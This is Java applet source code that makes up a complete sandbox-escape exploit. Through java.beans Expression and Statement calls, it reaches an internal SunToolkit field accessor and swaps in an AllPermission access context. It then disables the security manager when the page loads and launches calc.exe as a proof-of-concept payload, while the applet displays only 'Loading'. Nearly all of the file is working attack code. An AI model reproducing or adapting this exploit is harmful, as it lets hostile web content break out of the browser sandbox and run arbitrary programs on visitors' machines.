package techniques.a;

import java.applet.Applet;
import java.awt.Graphics;
import java.beans.Expression;
import java.beans.Statement;
import java.lang.reflect.Field;
import java.net.URL;
import java.security.*;
import java.security.cert.Certificate;

public class Application extends Applet {

	public Application() {
	}

	public void method1() throws Throwable {
		Statement localStatement = new Statement(System.class, "setSecurityManager", new Object[1]);
		Permissions localPermissions = new Permissions();
		localPermissions.add(new AllPermission());
		ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
		AccessControlContext localAccessControlContext = new AccessControlContext(new ProtectionDomain[] { localProtectionDomain });
		method3(Statement.class, "acc", localStatement, localAccessControlContext);
		localStatement.execute();
	}

	private Class method2(String paramString) throws Throwable {
		Object arrayOfObject[] = new Object[1];
		arrayOfObject[0] = paramString;
		Expression localExpression = new Expression(Class.class, "forName", arrayOfObject);
		localExpression.execute();
		return (Class) localExpression.getValue();
	}

	private void method3(Class paramClass, String paramString, Object paramObject1, Object paramObject2) throws Throwable {
		Object arrayOfObject[] = new Object[2];
		arrayOfObject[0] = paramClass;
		arrayOfObject[1] = paramString;
		Expression localExpression = new Expression(method2("sun.awt.SunToolkit"), "getField", arrayOfObject);
		localExpression.execute();
		((Field) localExpression.getValue()).set(paramObject1, paramObject2);
	}

	@Override
	public void init() {
		try {
			method1();
			Process localProcess = null;
			localProcess = Runtime.getRuntime().exec("calc.exe");
			if (localProcess != null)
				;
			localProcess.waitFor();
		} catch (Throwable localThrowable) {
			localThrowable.printStackTrace();
		}
	}

	@Override
	public void paint(Graphics paramGraphics) {
		paramGraphics.drawString("Loading", 50, 25);
	}
}
